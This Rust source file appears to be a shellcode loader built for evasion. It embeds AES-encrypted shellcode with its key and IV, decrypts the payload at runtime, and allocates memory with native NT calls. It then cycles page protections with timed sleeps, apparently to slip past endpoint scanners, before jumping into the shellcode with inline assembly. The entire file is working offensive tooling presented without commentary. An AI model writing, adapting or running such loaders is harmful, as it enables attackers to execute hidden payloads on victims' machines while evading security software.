#![feature(asm)]
use aes::{Aes128};
use cfb_mode::Cfb;
use cfb_mode::cipher::{NewCipher, AsyncStreamCipher};
use std::{thread::sleep, time::Duration};
use windows::{Win32::System::Memory::*};
use ntapi::{ntmmapi::*, ntpsapi::*, winapi::ctypes::*};

type Aes128Cfb = Cfb<Aes128>;

pub struct Injector {
    shellcode: Vec<u8>,
}

impl Injector {
    pub fn new(shellcode: Vec<u8>) -> Injector {
        Injector { shellcode }
    }

    pub fn run_in_current_process(&mut self) {
        unsafe {
            let mut protect = PAGE_NOACCESS.0;
            let mut map_ptr: *mut c_void = std::ptr::null_mut();
            NtAllocateVirtualMemory(NtCurrentProcess, &mut map_ptr, 0, &mut self.shellcode.len(), MEM_COMMIT.0 | MEM_RESERVE.0, protect);
            sleep(Duration::from_secs(3));
            NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut self.shellcode.len(), PAGE_READWRITE.0, &mut protect);
            sleep(Duration::from_secs(3));
            std::ptr::copy_nonoverlapping(self.shellcode.as_ptr(), map_ptr as *mut u8, self.shellcode.len());
            NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut self.shellcode.len(), PAGE_NOACCESS.0, &mut protect);
            sleep(Duration::from_secs(3));
            NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut self.shellcode.len(), PAGE_EXECUTE.0, &mut protect);
            sleep(Duration::from_secs(3));
            asm!("jmp {}", in(reg) map_ptr);
        }
    }
}

const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.enc");
const SHELLCODE_LENGTH: usize = SHELLCODE_BYTES.len();

#[no_mangle]
#[link_section = ".text"]
static SHELLCODE: [u8; SHELLCODE_LENGTH] = *include_bytes!("../shellcode.enc");
static AES_KEY: [u8; 16] = *include_bytes!("../aes.key");
static AES_IV: [u8; 16] = *include_bytes!("../aes.iv");

fn decrypt_shellcode_stub() -> Vec<u8> {
    let mut cipher = Aes128Cfb::new_from_slices(&AES_KEY, &AES_IV).unwrap();
    let mut buf = SHELLCODE.to_vec();
    cipher.decrypt(&mut buf);
    buf
}

fn main() {
    let mut injector = Injector::new(decrypt_shellcode_stub());
    injector.run_in_current_process();
}
